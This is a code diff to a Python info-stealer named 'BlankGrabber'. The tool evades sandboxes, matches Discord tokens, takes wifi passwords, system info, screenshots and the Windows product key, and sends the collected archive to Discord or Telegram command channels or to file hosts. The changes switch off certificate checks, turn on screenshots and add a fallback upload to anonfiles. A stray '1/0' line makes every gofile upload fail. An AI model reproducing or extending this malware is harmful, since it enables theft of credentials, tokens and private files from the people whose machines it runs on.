@@ -20,7 +20,8 @@ import logging
 
 from threading import Thread
 from ctypes import wintypes
-from urllib3 import PoolManager, HTTPResponse
+from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3
+disable_warnings_urllib3()
 
 class Settings:
 
@@ -94,7 +95,7 @@ class VmProtect:
     @staticmethod
     def checkHosting() -> bool: # Checks if the user's system in running on a server or not
         Logger.info("Checking if system is hosted online")
-        http = PoolManager()
+        http = PoolManager(cert_reqs="CERT_NONE")
         try:
             return http.request('GET', 'http://ip-api.com/line/?fields=hosting').data.decode().strip() == 'true'
         except Exception:
@@ -104,7 +105,7 @@ class VmProtect:
     @staticmethod
     def checkHTTPSimulation() -> bool: # Checks if the user is simulating a fake HTTPS connection or not
         Logger.info("Checking if system is simulating connection")
-        http = PoolManager(timeout= 1.0)
+        http = PoolManager(cert_reqs="CERT_NONE", timeout= 1.0)
         try:
             http.request('GET', f'https://blank-{Utility.GetRandomString()}.in')
         except Exception:
@@ -385,7 +386,7 @@ class Utility:
     
     @staticmethod
     def IsConnectedToInternet() -> bool: # Checks if the user is connected to internet
-        http = PoolManager()
+        http = PoolManager(cert_reqs="CERT_NONE")
         try:
             return http.request("GET", "https://gstatic.com/generate_204").status == 204
         except Exception:
@@ -615,7 +616,7 @@ class Browsers:
 
 class Discord:
 
-    httpClient = PoolManager() # Client for http requests
+    httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
     LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
     REGEX = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}" # Regular expression for matching tokens
@@ -929,8 +930,8 @@ class BlankGrabber:
             (self.GetDirectoryTree, False),
             (self.GetWifiPasswords, False),
             (self.StealSystemInfo, False),
-            (self.TakeScreenshot, False),
             (self.BlockSites, False),
+            (self.TakeScreenshot, True),
             (self.Webshot, True),
             (self.StealCommonFiles, True)
         ):
@@ -1491,24 +1492,31 @@ class BlankGrabber:
             except Exception:
                 Logger.info("Failed to generate tree")
     
-    def UploadToGofile(self, path, filename= None) -> str | None: # Uploads a file to gofile.io
+    def UploadToExternalService(self, path, filename= None) -> str | None: # Uploads a file to gofile.io
         if os.path.isfile(path):
-            Logger.info("Uploading %s to gofile.io" % (filename or "file"))
+            Logger.info("Uploading %s to gofile" % (filename or "file"))
             with open(path, "rb") as file:
                 fileBytes = file.read()
 
             if filename is None:
                 filename = os.path.basename(path)
-            http = PoolManager()
+            http = PoolManager(cert_reqs="CERT_NONE")
 
             try:
+                1/0
                 server = json.loads(http.request("GET", "https://api.gofile.io/getServer").data.decode())["data"]["server"]
                 if server:
                     url = json.loads(http.request("POST", "https://{}.gofile.io/uploadFile".format(server), fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["downloadPage"]
                     if url:
                         return url
             except Exception:
-                Logger.info("Failed to upload to gofile.io")
+                try:
+                    Logger.error("Failed to upload to gofile, trying to upload to anonfiles")
+                    url = json.loads(http.request("POST", "https://api.anonfiles.com/upload", fields= {"file" : (filename, fileBytes)}).data.decode())["data"]["file"]["url"]["short"]
+                    return url
+                except Exception:
+                     Logger.error("Failed to upload to anonfiles")
+                     return None
 
     def SendData(self) -> None: # Sends data to the webhook
         extention = self.CreateArchive()
@@ -1523,7 +1531,7 @@ class BlankGrabber:
             gpu = subprocess.run("wmic path win32_VideoController get name", capture_output= True, shell= True).stdout.decode(errors= 'ignore').splitlines()[2].strip()
             productKey = subprocess.run("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault", capture_output= True, shell= True).stdout.decode(errors= 'ignore').strip()
 
-            http = PoolManager()
+            http = PoolManager(cert_reqs="CERT_NONE")
 
             try:
                 r: dict = json.loads(http.request("GET", "http://ip-api.com/json/?fields=225545").data.decode())
@@ -1591,7 +1599,9 @@ class BlankGrabber:
 
             if (Settings.C2[0] == 0 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 20) \
                 or (Settings.C2[0] == 1 and os.path.getsize(self.ArchivePath) / (1024 * 1024) > 40): # Max upload size for Discord is 25 MB and for Telegram is 50 MB
-                url = self.UploadToGofile(self.ArchivePath, filename)                                # But just to make sure we set the limit to 20 MB for Discord and 40 MB for Telegram
+                url = self.UploadToExternalService(self.ArchivePath, filename)                       # But just to make sure we set the limit to 20 MB for Discord and 40 MB for Telegram
+                if url is None:
+                    raise Exception("Failed to upload to external service")
             else:
                 url = None
             
